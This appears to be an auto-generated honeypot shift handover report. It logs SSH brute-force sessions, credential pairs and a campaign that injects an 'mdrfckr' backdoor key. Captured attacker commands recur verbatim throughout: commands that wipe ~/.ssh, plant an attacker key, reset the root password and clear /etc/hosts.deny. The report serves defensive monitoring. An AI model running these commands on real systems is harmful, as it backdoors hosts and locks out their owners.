# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T16:33:17Z |
| **Shift Time** | 16:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **56** |
| False Positives Filtered | **13** (18.8%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **17** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **57** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **36** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **17** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 7 |
| `Blank` | 2 |
| `ubuntu` | 2 |
| `oracle` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 5 |
| `159753` | 2 |
| `admin` | 1 |
| `password` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 5 |
| `oracle` | `admin` | 1 |
| `Config` | `password` | 1 |
| `Debian` | `test` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@SsW0rd` | `46.101.114.131` | 2026-03-29T14:59:03 |
| `root` | `3245gs5662d34` | `46.101.114.131` | 2026-03-29T14:59:07 |
| `root` | `alone` | `103.191.92.72` | 2026-03-29T15:57:57 |
| `root` | `3245gs5662d34` | `103.191.92.72` | 2026-03-29T15:58:02 |
| `root` | `dolphin1` | `52.168.141.47` | 2026-03-29T16:02:56 |
| `root` | `3245gs5662d34` | `52.168.141.47` | 2026-03-29T16:03:24 |
| `root` | `Password100` | `101.126.54.95` | 2026-03-29T16:12:51 |
| `root` | `we123456.` | `14.103.164.204` | 2026-03-29T16:16:57 |
| `root` | `3245gs5662d34` | `14.103.164.204` | 2026-03-29T16:17:04 |
| `root` | `zhangyu123` | `191.6.25.239` | 2026-03-29T16:20:49 |
| `root` | `3245gs5662d34` | `191.6.25.239` | 2026-03-29T16:20:56 |
| `root` | `sohel123` | `101.126.54.95` | 2026-03-29T16:26:44 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:uDghteW3iGXy"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.54.95`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `191.6.25.239`, `14.103.164.204`, `103.191.92.72`, `46.101.114.131`, `52.168.141.47`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **30** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8551` | Bezeq International Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-92bda70f4f78

| Field | Detail |
|---|---|
| **Source IP** | `46.101.114[.]131` |
| **First Seen** | 2026-03-29 14:59 |
| **Last Seen** | 2026-03-29 14:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 14:59:03` | `cowrie.session.connect` |
| `2026-03-29 14:59:03` | `cowrie.client.version` |
| `2026-03-29 14:59:03` | `cowrie.client.kex` |
| `2026-03-29 14:59:03` | `cowrie.login.success` |
| `2026-03-29 14:59:04` | `cowrie.session.params` |
| `2026-03-29 14:59:04` | `cowrie.command.input` |
| `2026-03-29 14:59:04` | `cowrie.command.failed` |
| `2026-03-29 14:59:04` | `cowrie.log.closed` |
| `2026-03-29 14:59:04` | `cowrie.session.params` |
| `2026-03-29 14:59:04` | `cowrie.command.input` |
| `2026-03-29 14:59:04` | `cowrie.session.file_download` |
| `2026-03-29 14:59:04` | `cowrie.log.closed` |
| `2026-03-29 14:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.114[.]131` to AbuseIPDB if not already reported
- [ ] Block `46.101.114[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726fd15f70b1

| Field | Detail |
|---|---|
| **Source IP** | `46.101.114[.]131` |
| **First Seen** | 2026-03-29 14:59 |
| **Last Seen** | 2026-03-29 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 14:59:06` | `cowrie.session.connect` |
| `2026-03-29 14:59:06` | `cowrie.client.version` |
| `2026-03-29 14:59:06` | `cowrie.client.kex` |
| `2026-03-29 14:59:07` | `cowrie.login.success` |
| `2026-03-29 14:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.114[.]131` to AbuseIPDB if not already reported
- [ ] Block `46.101.114[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0390da5925

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]72` |
| **First Seen** | 2026-03-29 15:57 |
| **Last Seen** | 2026-03-29 15:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 15:57:55` | `cowrie.session.connect` |
| `2026-03-29 15:57:55` | `cowrie.client.version` |
| `2026-03-29 15:57:56` | `cowrie.client.kex` |
| `2026-03-29 15:57:57` | `cowrie.login.success` |
| `2026-03-29 15:57:57` | `cowrie.session.params` |
| `2026-03-29 15:57:57` | `cowrie.command.input` |
| `2026-03-29 15:57:57` | `cowrie.command.failed` |
| `2026-03-29 15:57:57` | `cowrie.log.closed` |
| `2026-03-29 15:57:58` | `cowrie.session.params` |
| `2026-03-29 15:57:58` | `cowrie.command.input` |
| `2026-03-29 15:57:58` | `cowrie.session.file_download` |
| `2026-03-29 15:57:58` | `cowrie.log.closed` |
| `2026-03-29 15:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add564065be0

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]72` |
| **First Seen** | 2026-03-29 15:58 |
| **Last Seen** | 2026-03-29 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 15:58:01` | `cowrie.session.connect` |
| `2026-03-29 15:58:01` | `cowrie.client.version` |
| `2026-03-29 15:58:01` | `cowrie.client.kex` |
| `2026-03-29 15:58:02` | `cowrie.login.success` |
| `2026-03-29 15:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf2698b691d

| Field | Detail |
|---|---|
| **Source IP** | `52.168.141[.]47` |
| **First Seen** | 2026-03-29 16:02 |
| **Last Seen** | 2026-03-29 16:03 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:02:51` | `cowrie.session.connect` |
| `2026-03-29 16:02:51` | `cowrie.client.version` |
| `2026-03-29 16:02:52` | `cowrie.client.kex` |
| `2026-03-29 16:02:56` | `cowrie.login.success` |
| `2026-03-29 16:02:58` | `cowrie.session.params` |
| `2026-03-29 16:02:58` | `cowrie.command.input` |
| `2026-03-29 16:02:58` | `cowrie.command.failed` |
| `2026-03-29 16:03:01` | `cowrie.log.closed` |
| `2026-03-29 16:03:04` | `cowrie.session.params` |
| `2026-03-29 16:03:04` | `cowrie.command.input` |
| `2026-03-29 16:03:06` | `cowrie.session.file_download` |
| `2026-03-29 16:03:06` | `cowrie.log.closed` |
| `2026-03-29 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.168.141[.]47` to AbuseIPDB if not already reported
- [ ] Block `52.168.141[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a234e4187af

| Field | Detail |
|---|---|
| **Source IP** | `52.168.141[.]47` |
| **First Seen** | 2026-03-29 16:03 |
| **Last Seen** | 2026-03-29 16:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:03:17` | `cowrie.session.connect` |
| `2026-03-29 16:03:19` | `cowrie.client.version` |
| `2026-03-29 16:03:19` | `cowrie.client.kex` |
| `2026-03-29 16:03:24` | `cowrie.login.success` |
| `2026-03-29 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.168.141[.]47` to AbuseIPDB if not already reported
- [ ] Block `52.168.141[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35af6768a06a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]95` |
| **First Seen** | 2026-03-29 16:12 |
| **Last Seen** | 2026-03-29 16:14 |
| **Session Duration** | 86s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RY4obYKRFzr7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:12:47` | `cowrie.session.connect` |
| `2026-03-29 16:12:47` | `cowrie.client.version` |
| `2026-03-29 16:12:49` | `cowrie.client.kex` |
| `2026-03-29 16:12:51` | `cowrie.login.success` |
| `2026-03-29 16:12:52` | `cowrie.session.params` |
| `2026-03-29 16:12:52` | `cowrie.command.input` |
| `2026-03-29 16:12:52` | `cowrie.command.failed` |
| `2026-03-29 16:12:54` | `cowrie.log.closed` |
| `2026-03-29 16:12:55` | `cowrie.session.params` |
| `2026-03-29 16:12:55` | `cowrie.command.input` |
| `2026-03-29 16:12:55` | `cowrie.session.file_download` |
| `2026-03-29 16:12:55` | `cowrie.log.closed` |
| `2026-03-29 16:13:08` | `cowrie.session.params` |
| `2026-03-29 16:13:08` | `cowrie.command.input` |
| `2026-03-29 16:13:08` | `cowrie.log.closed` |
| `2026-03-29 16:13:10` | `cowrie.session.params` |
| `2026-03-29 16:13:10` | `cowrie.command.input` |
| `2026-03-29 16:13:13` | `cowrie.log.closed` |
| `2026-03-29 16:13:14` | `cowrie.session.params` |
| `2026-03-29 16:13:14` | `cowrie.command.input` |
| `2026-03-29 16:13:14` | `cowrie.session.file_download` |
| `2026-03-29 16:13:14` | `cowrie.log.closed` |
| `2026-03-29 16:13:16` | `cowrie.session.params` |
| `2026-03-29 16:13:16` | `cowrie.command.input` |
| `2026-03-29 16:13:17` | `cowrie.log.closed` |
| `2026-03-29 16:13:28` | `cowrie.session.params` |
| `2026-03-29 16:13:28` | `cowrie.command.input` |
| `2026-03-29 16:13:28` | `cowrie.command.input` |
| `2026-03-29 16:13:28` | `cowrie.log.closed` |
| `2026-03-29 16:13:29` | `cowrie.session.params` |
| `2026-03-29 16:13:29` | `cowrie.command.input` |
| `2026-03-29 16:13:31` | `cowrie.log.closed` |
| `2026-03-29 16:13:31` | `cowrie.session.params` |
| `2026-03-29 16:13:31` | `cowrie.command.input` |
| `2026-03-29 16:13:33` | `cowrie.log.closed` |
| `2026-03-29 16:13:34` | `cowrie.session.params` |
| `2026-03-29 16:13:34` | `cowrie.command.input` |
| `2026-03-29 16:13:37` | `cowrie.log.closed` |
| `2026-03-29 16:13:41` | `cowrie.session.params` |
| `2026-03-29 16:13:41` | `cowrie.command.input` |
| `2026-03-29 16:13:42` | `cowrie.log.closed` |
| `2026-03-29 16:13:43` | `cowrie.session.params` |
| `2026-03-29 16:13:43` | `cowrie.command.input` |
| `2026-03-29 16:13:44` | `cowrie.log.closed` |
| `2026-03-29 16:13:49` | `cowrie.session.params` |
| `2026-03-29 16:13:49` | `cowrie.command.input` |
| `2026-03-29 16:13:49` | `cowrie.log.closed` |
| `2026-03-29 16:13:51` | `cowrie.session.params` |
| `2026-03-29 16:13:51` | `cowrie.command.input` |
| `2026-03-29 16:14:07` | `cowrie.log.closed` |
| `2026-03-29 16:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]95` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9984195ed8ad

| Field | Detail |
|---|---|
| **Source IP** | `14.103.164[.]204` |
| **First Seen** | 2026-03-29 16:16 |
| **Last Seen** | 2026-03-29 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:16:56` | `cowrie.session.connect` |
| `2026-03-29 16:16:56` | `cowrie.client.version` |
| `2026-03-29 16:16:56` | `cowrie.client.kex` |
| `2026-03-29 16:16:57` | `cowrie.login.success` |
| `2026-03-29 16:16:57` | `cowrie.session.params` |
| `2026-03-29 16:16:57` | `cowrie.command.input` |
| `2026-03-29 16:16:57` | `cowrie.command.failed` |
| `2026-03-29 16:16:57` | `cowrie.log.closed` |
| `2026-03-29 16:16:58` | `cowrie.session.params` |
| `2026-03-29 16:16:58` | `cowrie.command.input` |
| `2026-03-29 16:16:58` | `cowrie.session.file_download` |
| `2026-03-29 16:16:58` | `cowrie.log.closed` |
| `2026-03-29 16:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.164[.]204` to AbuseIPDB if not already reported
- [ ] Block `14.103.164[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35006d0dd25e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.164[.]204` |
| **First Seen** | 2026-03-29 16:17 |
| **Last Seen** | 2026-03-29 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:17:03` | `cowrie.session.connect` |
| `2026-03-29 16:17:03` | `cowrie.client.version` |
| `2026-03-29 16:17:04` | `cowrie.client.kex` |
| `2026-03-29 16:17:04` | `cowrie.login.success` |
| `2026-03-29 16:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.164[.]204` to AbuseIPDB if not already reported
- [ ] Block `14.103.164[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41ab16cb989

| Field | Detail |
|---|---|
| **Source IP** | `191.6.25[.]239` |
| **First Seen** | 2026-03-29 16:20 |
| **Last Seen** | 2026-03-29 16:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:20:48` | `cowrie.session.connect` |
| `2026-03-29 16:20:48` | `cowrie.client.version` |
| `2026-03-29 16:20:48` | `cowrie.client.kex` |
| `2026-03-29 16:20:49` | `cowrie.login.success` |
| `2026-03-29 16:20:50` | `cowrie.session.params` |
| `2026-03-29 16:20:50` | `cowrie.command.input` |
| `2026-03-29 16:20:50` | `cowrie.command.failed` |
| `2026-03-29 16:20:50` | `cowrie.log.closed` |
| `2026-03-29 16:20:51` | `cowrie.session.params` |
| `2026-03-29 16:20:51` | `cowrie.command.input` |
| `2026-03-29 16:20:51` | `cowrie.session.file_download` |
| `2026-03-29 16:20:51` | `cowrie.log.closed` |
| `2026-03-29 16:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.6.25[.]239` to AbuseIPDB if not already reported
- [ ] Block `191.6.25[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd9023b5a4b6

| Field | Detail |
|---|---|
| **Source IP** | `191.6.25[.]239` |
| **First Seen** | 2026-03-29 16:20 |
| **Last Seen** | 2026-03-29 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 16:20:55` | `cowrie.session.connect` |
| `2026-03-29 16:20:55` | `cowrie.client.version` |
| `2026-03-29 16:20:55` | `cowrie.client.kex` |
| `2026-03-29 16:20:56` | `cowrie.login.success` |
| `2026-03-29 16:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.6.25[.]239` to AbuseIPDB if not already reported
- [ ] Block `191.6.25[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f955c2324a51

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]95` |
| **First Seen** | 2026-03-29 16:26 |
| **Last Seen** | 2026-03-29 16:27 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
